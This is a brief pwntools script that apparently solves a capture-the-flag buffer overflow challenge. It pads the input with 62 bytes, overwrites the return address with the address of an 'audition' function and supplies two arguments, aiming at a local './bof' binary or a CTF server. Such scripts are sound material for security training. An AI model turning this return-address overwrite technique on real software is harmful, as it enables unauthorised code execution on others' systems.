from pwn import *
p = process("./bof")
#p = remote("ctf.umbccd.io",4000)
param1 = 1200
param2 = 366
audition = 0x8049182
padd = "A" * 62

payload = ""
payload +=padd	
payload += p32(audition)
payload += "BBBB"
payload += p32(param1)
payload += p32(param2)

p.sendlineafter("What's your name?\n",payload)
p.interactive()